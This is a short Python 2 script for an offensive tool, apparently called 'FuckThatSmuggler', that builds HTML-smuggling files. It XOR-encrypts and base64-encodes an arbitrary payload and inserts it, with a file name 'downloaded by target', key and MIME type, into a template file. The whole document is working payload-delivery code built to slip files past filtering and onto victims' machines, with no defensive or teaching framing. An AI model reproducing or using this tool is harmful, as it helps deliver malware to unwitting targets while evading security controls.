import argparse
import os
import base64
from mimetypes import MimeTypes

print("""\


  ______          _ _______ _           _    _____                             _           
 |  ____|        | |__   __| |         | |  / ____|                           | |          
 | |__ _   _  ___| | _| |  | |__   __ _| |_| (___  _ __ ___  _   _  __ _  __ _| | ___ _ __ 
 |  __| | | |/ __| |/ / |  | '_ \ / _` | __|\___ \| '_ ` _ \| | | |/ _` |/ _` | |/ _ \ '__|
 | |  | |_| | (__|   <| |  | | | | (_| | |_ ____) | | | | | | |_| | (_| | (_| | |  __/ |   
 |_|   \__,_|\___|_|\_\_|  |_| |_|\__,_|\__|_____/|_| |_| |_|\__,_|\__, |\__, |_|\___|_|   
                                                                    __/ | __/ |            
                                                                   |___/ |___/             



""")


def parseFile(file):
	try:
        	with open(file,"r") as f:
                	payload = f.read()
			return payload
	except IOError:
        	print("[-] Couldn't open  " + file)
        	os._exit(1)


def encryptPayload(payload,key):
	temp = ''.join(chr(ord(a) ^ key) for a in payload)
	return base64.standard_b64encode(temp)


parser = argparse.ArgumentParser()
parser.add_argument("-k","--key", help="integer key use of XOR operation",type=int,dest='key',required=True)
parser.add_argument("-f","--file",help="path of the file",type=str,dest='file',required=True)
parser.add_argument("-t","--template",help="path of the template file",type=str,dest="template",required=True)
parser.add_argument("-fn","--file-name",help="Name of the that will be downloaded by target",type=str,dest="name",required=True)
parser.add_argument("-o","--output",help="output payload into file",type=str,dest="output")
args = parser.parse_args()

mime = MimeTypes()
mime_type = mime.guess_type(args.file)
print("[+] Parsing payload and template")
payload = parseFile(args.file)
template = parseFile(args.template)
print("[+] Encrypting payload")
result = encryptPayload(payload,args.key)

print("[+] Replacing template")
template = template.replace("%%DATA%%",result)
template = template.replace("%%NAME%%",args.name)
template = template.replace("%%KEY%%",str(args.key))
template = template.replace("%%MIME%%",str(mime_type[0]))
if args.output:
	print("[+] saving smugg file to " + args.output)
	f = open(args.output,"w")
	f.write(template)
	f.close()
else:
	print(template)
